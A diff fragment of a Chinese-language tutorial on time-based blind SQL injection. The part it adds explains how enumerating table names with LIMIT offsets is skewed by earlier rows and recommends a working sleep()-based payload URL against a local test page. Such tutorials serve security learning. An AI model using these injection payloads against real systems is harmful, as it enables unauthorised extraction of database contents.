@@ -133,6 +133,18 @@ http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(id,1,1)=%221%2
 
 ![](http://p3ek8hcdl.bkt.clouddn.com/image/032b1490329624.jpg)
 
+
+### 补充
+```
+上面的语句查询其他表时会受到前面数据的影响
+两个表admin，news
+后面limit 0,1判断的就是第一个表admin   也就是猜第一位必须是a才返回true     后面limit 1,1的时候   猜第一位a和n都会返回true  其他false
+```
+查询其他表推荐语句
+```
+http://127.0.0.1/sqlin/sqltest.php?id=1%20and%20if((length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1))=4),sleep(5),0)
+感觉应该是查询语句和sleep执行顺序的问题
+```
 获取其他同理
 
 有错误的地方欢迎指正，共同进步。
